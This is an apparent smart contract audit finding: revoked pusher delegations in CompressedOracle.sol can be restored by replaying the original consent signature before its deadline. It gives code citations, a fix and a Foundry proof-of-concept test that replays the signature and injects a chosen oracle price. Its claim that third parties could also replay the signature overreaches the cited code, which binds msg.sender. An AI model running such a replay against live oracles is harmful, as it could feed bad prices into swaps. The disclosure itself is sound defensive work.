### Title
Pusher Consent Signature Not Invalidated After `revokePusher()` Allows Creator to Silently Re-Establish Revoked Delegation — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

### Summary

`allowPushers` never marks a consent signature as consumed. After a pusher calls `revokePusher()` to clear their delegation, the creator can immediately replay the original EIP-191 signature (while the deadline has not yet expired) to re-establish `namespaceRemapping[pusher] = creator`. The pusher's revocation is silently undone, and subsequent fallback pushes from that wallet continue to land in the creator's namespace without any new consent from the pusher.

### Finding Description

`allowPushers` verifies a pusher's EIP-191 consent signature and writes `namespaceRemapping[pusher] = msg.sender`: [1](#0-0) 

The only replay guard is the deadline check in `_ensureDeadline`: [2](#0-1) 

`revokePusher()` clears the mapping but stores nothing to mark the signature as spent: [3](#0-2) 

Because no nonce, used-signature bitmap, or per-pusher revocation epoch is recorded, the creator retains the original `(chainid, oracle, deadline, pusher, creator)` signature bytes and can call `allowPushers` again with the identical arguments at any point before `deadline`. The mapping is overwritten back to `creator`, and the `PusherAuthorized` event fires again — indistinguishable from a fresh consent.

The code comment acknowledges the risk but incorrectly claims the deadline fully mitigates it: [4](#0-3) 

The deadline prevents replay *after* it expires; it does nothing to prevent replay *within* the deadline window after the pusher has revoked.

The `fallback` push path reads `namespaceRemapping[msg.sender]` at call time: [5](#0-4) 

So any push the wallet makes after the creator's replay lands in the creator's namespace, not the pusher's own.

### Impact Explanation

A pusher whose private key is suspected compromised calls `revokePusher()` to stop bad prices from reaching the creator's oracle feeds. The creator (or an attacker who obtained the original calldata from the initial `allowPushers` transaction on-chain) replays the same signature before the deadline expires. The compromised pusher key is re-delegated without any new on-chain consent. Subsequent fallback pushes from the compromised key overwrite the creator's oracle slots with attacker-controlled prices. Those prices are consumed by `price(feedId, pool)` and propagate to any pool using this `CompressedOracleV1` as its price provider, enabling bad-price execution in live swaps.

### Likelihood Explanation

The original `allowPushers` calldata (including the full signature bytes) is permanently visible on-chain. Any creator who wishes to re-establish a revoked delegation needs only to resubmit the same transaction before the deadline. Deadlines are typically set days in the future (the test suite uses `block.timestamp + 1 days`). The window is wide and the replay requires no special privilege — only the creator role, which is the same party who initiated the original delegation.

### Recommendation

Record each consumed signature hash in a `mapping(bytes32 => bool) private _usedSignatures` and revert if the hash has already been seen:

```solidity
bytes32 sigHash = keccak256(signatures[i]);
require(!_usedSignatures[sigHash], "signature already used");
_usedSignatures[sigHash] = true;
```

Alternatively, include a per-pusher monotonic nonce in the signed payload so that each consent can only be used once regardless of deadline.

### Proof of Concept

```solidity
// 1. Pusher signs consent with deadline = now + 1 day
uint256 deadline = block.timestamp + 1 days;
bytes memory sig = _signConsent(PUSHER_KEY, deadline, pusher, creator);

address[] memory pushers = new address[](1);
pushers[0] = pusher;
bytes[] memory sigs = new bytes[](1);
sigs[0] = sig;

// 2. Creator establishes delegation
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);
assertEq(oracle.namespaceRemapping(pusher), creator); // delegated

// 3. Pusher self-revokes
vm.prank(pusher);
oracle.revokePusher();
assertEq(oracle.namespaceRemapping(pusher), address(0)); // revoked

// 4. Creator replays the SAME signature — deadline still valid
vm.prank(creator);
oracle.allowPushers(deadline, pushers, sigs);           // succeeds, no revert
assertEq(oracle.namespaceRemapping(pusher), creator);   // delegation silently restored

// 5. Pusher's next push lands in creator's namespace without new consent
uint56 tsMs = uint56(block.timestamp * 1000);
uint48 raw = _packRaw(9_999_999, 8, 8); // attacker-controlled price
vm.prank(pusher);
(bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
assertTrue(ok);
// Creator's feed now contains the bad price
assertEq(
    oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price,
    U64x32.decode(uint32(raw >> 16))
);
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-191)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L192-211)
```text
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
        _ensureDeadline(deadline);

        uint256 l = pushers.length;
        require(l == signatures.length);
        for (uint256 i; i < l; i++) {
            address pusher = pushers[i];

            if (pusher == msg.sender) {
                revert NoSelfRemapping();
            }

            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
            emit PusherAuthorized(pusher, msg.sender);
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-316)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```
